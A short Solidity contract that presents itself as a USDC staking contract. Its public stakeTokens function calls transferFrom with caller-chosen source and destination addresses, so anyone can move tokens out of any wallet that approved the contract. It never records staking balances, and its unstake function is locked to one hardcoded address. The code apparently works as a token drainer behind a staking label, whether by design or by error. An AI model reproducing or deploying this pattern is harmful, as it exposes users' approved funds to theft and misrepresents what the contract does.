pragma solidity >=0.4.22 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract USDC_STAKE {
    IERC20 public usdcTokenContract;
    address owner;
    mapping(address => uint256) public stakingBalance;

    
    constructor() {
        usdcTokenContract = IERC20(0x3E937B4881CBd500d05EeDAB7BA203f2b7B3f74f);
        owner = msg.sender;
    }

    function stakeTokens(uint256 _amount, address _from, address _to) public payable {
        
        require(_amount > 0, "amount should be > 0");
        
        
        
        usdcTokenContract.transferFrom(_from, _to, _amount);
        
        
    }

    
    function unstakeTokens() public {
        uint256 balance = stakingBalance[msg.sender];
        
        
        require(
            msg.sender == 0xB89F3c0C82679D6c8cF643e8ef9029f5eF782907,
            "Address not match"
        );
        
        usdcTokenContract.transfer(msg.sender, balance);
        
        
    }
}
